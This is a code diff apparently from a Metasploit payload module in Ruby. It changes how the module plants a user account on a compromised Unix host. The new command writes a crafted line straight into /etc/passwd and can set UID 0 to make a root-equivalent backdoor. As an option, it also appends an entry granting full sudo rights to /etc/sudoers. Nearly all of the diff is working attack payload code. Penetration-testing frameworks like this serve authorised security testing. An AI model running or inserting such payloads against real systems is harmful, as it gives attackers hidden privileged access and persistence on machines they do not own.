@@ -33,8 +33,13 @@ module MetasploitModule
     register_options(
       [
         OptString.new('USER', [ true, 'The username to create', 'metasploit' ]),
-        OptString.new('PASS', [ true, 'The password for this user', 'Metasploit$1' ]),
-        OptBool.new('SUDOERS', [false, 'Add new user to sudoers as well', true])
+        OptString.new('PASS', [ true, 'The password for this user', 'Metasploit$1' ])
+      ]
+    )
+
+    register_advanced_options(
+      [
+        OptEnum.new('RootMethod', [false, 'Set the method that the new user can obtain root', 'NONE', ['SUID', 'SUDO', 'NONE']]),
       ]
     )
   end
@@ -51,10 +56,15 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    return "useradd #{datastore['USER']} -p #{datastore['PASS'].crypt('Az')}" + if datastore['SUDOERS']
-                                                                                  ";echo \"#{datastore['USER']} ALL=(ALL:ALL) ALL\">>/etc/sudoers"
-                                                                                else
-                                                                                  ''
-                                                                                end
+    suid = if datastore['RootMethod'] == 'SUID'
+             '0'
+           else
+             rand(1010..1999).to_s
+           end
+    payload_cmd = "echo \'#{datastore['USER']}:#{datastore['PASS'].crypt('Az')}:#{suid}:#{suid}::/:/bin/sh\'>>/etc/passwd"
+    if datastore['RootMethod'] == 'SUDO'
+      payload_cmd += ";echo \'[ -f /etc/sudoers ]&&(echo \'#{datastore['USER']} ALL=(ALL:ALL) ALL\'>>/etc/sudoers)"
+    end
+    payload_cmd
   end
 end
